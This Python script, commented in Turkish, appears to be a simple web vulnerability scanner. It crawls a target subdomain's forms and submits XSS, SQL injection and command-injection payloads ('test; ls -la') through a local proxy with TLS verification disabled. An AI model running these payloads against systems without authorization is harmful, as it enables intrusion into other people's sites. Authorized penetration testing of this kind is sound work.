import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import urllib3
import warnings

# Uyarıları bastır
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

# Proxy ayarları
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# OWASP Top Ten zafiyetleri için payload'lar ve doğrulama kriterleri
payloads = {
    "XSS": {
        "payloads": [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'\"><script>alert('XSS')</script>"
        ],
        "check": lambda response, payload: payload in response.text
    },
    "SQLi": {
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "1 OR 1=1"
        ],
        "check": lambda response, payload: "syntax error" in response.text.lower() or "mysql" in response.text.lower()
    },
    "Command Injection": {
        "payloads": [
            "test; ls -la",
            "test && ls -la",
            "test | ls -la"
        ],
        "check": lambda response, payload: "total" in response.text.lower() and "drwx" in response.text.lower()
    },
    # Diğer zafiyet türleri için payload'lar eklenebilir
}

def find_forms(url):
    response = requests.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    return forms

def submit_form(form, url, payload):
    action = form.get('action')
    method = form.get('method', 'get').lower()
    inputs = form.find_all('input')
    data = {}

    for input in inputs:
        input_name = input.get('name')
        input_type = input.get('type')
        if input_type == 'text' or input_type == 'search':
            data[input_name] = payload
        else:
            data[input_name] = 'test'

    if method == 'post':
        response = requests.post(url + action, data=data, proxies=proxies, verify=False)
    else:
        response = requests.get(url + action, params=data, proxies=proxies, verify=False)
    
    return response

def test_vulnerabilities(url, payloads):
    forms = find_forms(url)
    found_vulnerabilities = False
    for form in forms:
        for vuln_type, details in payloads.items():
            for payload in details["payloads"]:
                response = submit_form(form, url, payload)
                if details["check"](response, payload):
                    print(f"\nPotential {vuln_type} vulnerability detected with payload: {payload}")
                    print(f"Form action: {form.get('action')}")
                    found_vulnerabilities = True
                    break

    if not found_vulnerabilities:
        print(f"No vulnerabilities found for {url}")

def process_subdomain(subdomain):
    print(f"[*] Testing {subdomain}")
    test_vulnerabilities(subdomain, payloads)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 test_vulnerabilities.py <subdomain>")
        sys.exit(1)
    subdomain = sys.argv[1]
    process_subdomain(subdomain)